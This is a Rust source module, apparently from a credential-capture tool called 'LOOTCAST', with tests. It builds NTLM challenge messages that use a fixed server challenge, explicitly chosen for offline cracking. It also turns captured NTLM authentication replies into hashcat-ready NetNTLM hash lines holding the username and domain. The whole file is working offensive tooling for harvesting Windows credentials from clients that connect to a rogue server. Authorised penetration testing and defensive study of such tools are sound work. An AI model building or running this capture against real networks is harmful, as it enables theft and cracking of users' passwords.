//! NTLMSSP CHALLENGE (Type 2) construction and AUTHENTICATE (Type 3) parsing.
use base64::{engine::general_purpose::STANDARD, Engine};

/// Classic fixed challenge — convenient for offline cracking.
pub const CHALLENGE: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

fn utf16(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
}

fn av_pair(id: u16, val: &[u8]) -> Vec<u8> {
    let mut v = id.to_le_bytes().to_vec();
    v.extend_from_slice(&(val.len() as u16).to_le_bytes());
    v.extend_from_slice(val);
    v
}

/// Raw CHALLENGE (Type 2) message bytes, including a TargetName and a TargetInfo
/// (AV pairs) — both required by NTLMv2 clients such as smbclient.
pub fn type2_bytes() -> Vec<u8> {
    let target_name = utf16("LOOTCAST");
    let nb = utf16("LOOTCAST");
    let dns = utf16("lootcast");
    let mut target_info = Vec::new();
    target_info.extend(av_pair(0x0002, &nb)); // MsvAvNbDomainName
    target_info.extend(av_pair(0x0001, &nb)); // MsvAvNbComputerName
    target_info.extend(av_pair(0x0004, &dns)); // MsvAvDnsDomainName
    target_info.extend(av_pair(0x0003, &dns)); // MsvAvDnsComputerName
    target_info.extend(av_pair(0x0000, &[])); // MsvAvEOL

    let tn_off: u32 = 48;
    let ti_off: u32 = tn_off + target_name.len() as u32;
    // UNICODE | REQUEST_TARGET | NTLM | ALWAYS_SIGN | TARGET_TYPE_DOMAIN | TARGET_INFO
    let flags: u32 = 0x1 | 0x4 | 0x200 | 0x8000 | 0x10000 | 0x80_0000;

    let mut m = Vec::new();
    m.extend_from_slice(b"NTLMSSP\0");
    m.extend_from_slice(&2u32.to_le_bytes()); // type 2
    m.extend_from_slice(&(target_name.len() as u16).to_le_bytes()); // TargetName len
    m.extend_from_slice(&(target_name.len() as u16).to_le_bytes()); // TargetName maxlen
    m.extend_from_slice(&tn_off.to_le_bytes()); // TargetName offset
    m.extend_from_slice(&flags.to_le_bytes());
    m.extend_from_slice(&CHALLENGE); // server challenge
    m.extend_from_slice(&[0u8; 8]); // reserved
    m.extend_from_slice(&(target_info.len() as u16).to_le_bytes()); // TargetInfo len
    m.extend_from_slice(&(target_info.len() as u16).to_le_bytes()); // TargetInfo maxlen
    m.extend_from_slice(&ti_off.to_le_bytes()); // TargetInfo offset
    m.extend_from_slice(&target_name);
    m.extend_from_slice(&target_info);
    m
}

/// CHALLENGE (Type 2) base64, for the WWW-Authenticate: NTLM header.
pub fn type2_b64() -> String {
    STANDARD.encode(type2_bytes())
}

fn utf16le(bytes: &[u8]) -> String {
    let units: Vec<u16> = bytes
        .chunks(2)
        .filter(|c| c.len() == 2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&units)
}

fn sec_buffer(m: &[u8], pos: usize) -> Option<(usize, usize)> {
    if pos + 8 > m.len() {
        return None;
    }
    let len = u16::from_le_bytes([m[pos], m[pos + 1]]) as usize;
    let off = u32::from_le_bytes([m[pos + 4], m[pos + 5], m[pos + 6], m[pos + 7]]) as usize;
    Some((len, off))
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

pub struct Captured {
    pub user: String,
    pub domain: String,
    pub hashcat: String,
}

/// Parses an AUTHENTICATE (Type 3) message from base64 into a hashcat line.
pub fn parse_type3(b64: &str) -> Option<Captured> {
    let m = STANDARD.decode(b64.trim()).ok()?;
    parse_type3_bytes(&m)
}

/// Parses raw AUTHENTICATE (Type 3) message bytes into a hashcat NetNTLM line.
pub fn parse_type3_bytes(m: &[u8]) -> Option<Captured> {
    if m.len() < 52 || &m[0..8] != b"NTLMSSP\0" {
        return None;
    }
    if u32::from_le_bytes([m[8], m[9], m[10], m[11]]) != 3 {
        return None;
    }
    let (lm_len, lm_off) = sec_buffer(m, 12)?;
    let (nt_len, nt_off) = sec_buffer(m, 20)?;
    let (dom_len, dom_off) = sec_buffer(m, 28)?;
    let (usr_len, usr_off) = sec_buffer(m, 36)?;

    let domain = m.get(dom_off..dom_off + dom_len).map(utf16le).unwrap_or_default();
    let user = m.get(usr_off..usr_off + usr_len).map(utf16le).unwrap_or_default();
    let nt = m.get(nt_off..nt_off + nt_len)?;
    let chal_hex = hex(&CHALLENGE);

    let hashcat = if nt_len > 24 {
        let proof = hex(&nt[0..16]);
        let blob = hex(&nt[16..]);
        format!("{user}::{domain}:{chal_hex}:{proof}:{blob}")
    } else if nt_len == 24 {
        let lm = m.get(lm_off..lm_off + lm_len).map(hex).unwrap_or_default();
        let nth = hex(nt);
        format!("{user}::{domain}:{lm}:{nth}:{chal_hex}")
    } else {
        return None;
    };
    Some(Captured { user, domain, hashcat })
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::{engine::general_purpose::STANDARD, Engine};

    fn utf16(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
    }

    /// Builds a well-formed NTLMv2 AUTHENTICATE (Type 3) message.
    pub fn build_type3(domain: &str, user: &str, proof: &[u8], blob: &[u8]) -> Vec<u8> {
        let dom = utf16(domain);
        let usr = utf16(user);
        let mut nt = proof.to_vec();
        nt.extend_from_slice(blob);
        let base = 64u32;
        let mut m = Vec::new();
        m.extend_from_slice(b"NTLMSSP\0");
        m.extend_from_slice(&3u32.to_le_bytes());
        let sb = |len: usize, off: u32| {
            let l = len as u16;
            let mut v = Vec::new();
            v.extend_from_slice(&l.to_le_bytes());
            v.extend_from_slice(&l.to_le_bytes());
            v.extend_from_slice(&off.to_le_bytes());
            v
        };
        m.extend_from_slice(&sb(0, base)); // LM @12
        m.extend_from_slice(&sb(nt.len(), base + dom.len() as u32 + usr.len() as u32)); // NT @20
        m.extend_from_slice(&sb(dom.len(), base)); // domain @28
        m.extend_from_slice(&sb(usr.len(), base + dom.len() as u32)); // user @36
        m.extend_from_slice(&sb(0, base)); // workstation @44
        m.extend_from_slice(&sb(0, base)); // session key @52
        m.extend_from_slice(&0u32.to_le_bytes()); // flags @60
        // payload @64
        m.extend_from_slice(&dom);
        m.extend_from_slice(&usr);
        m.extend_from_slice(&nt);
        m
    }

    fn hexs(b: &[u8]) -> String {
        b.iter().map(|x| format!("{x:02x}")).collect()
    }

    #[test]
    fn fuzz_parse_type3_no_panic() {
        let mut x: u64 = 0xA5A5_5A5A_F0F0_0F0F;
        for _ in 0..30_000 {
            x ^= x << 13; x ^= x >> 7; x ^= x << 17;
            let len = (x as usize) % 500;
            let mut buf: Vec<u8> = (0..len).map(|i| (x >> (i % 56)) as u8).collect();
            // also exercise the valid-signature branch
            if buf.len() >= 12 {
                buf[0..8].copy_from_slice(b"NTLMSSP\0");
                buf[8] = 3;
            }
            let _ = parse_type3_bytes(&buf);
        }
    }

    #[test]
    fn parses_ntlmv2_into_hashcat_line() {
        let proof = [0xAAu8; 16];
        // NTLMv2 blob must be > 8 bytes so the NT response exceeds 24 total.
        let blob: Vec<u8> = (0u8..28).collect();
        let msg = build_type3("CORP", "jdoe", &proof, &blob);
        let b64 = STANDARD.encode(&msg);
        let cap = parse_type3(&b64).expect("parse");
        assert_eq!(cap.user, "jdoe");
        assert_eq!(cap.domain, "CORP");
        let want = format!(
            "jdoe::CORP:1122334455667788:{}:{}",
            hexs(&proof),
            hexs(&blob)
        );
        assert_eq!(cap.hashcat, want);
    }
}
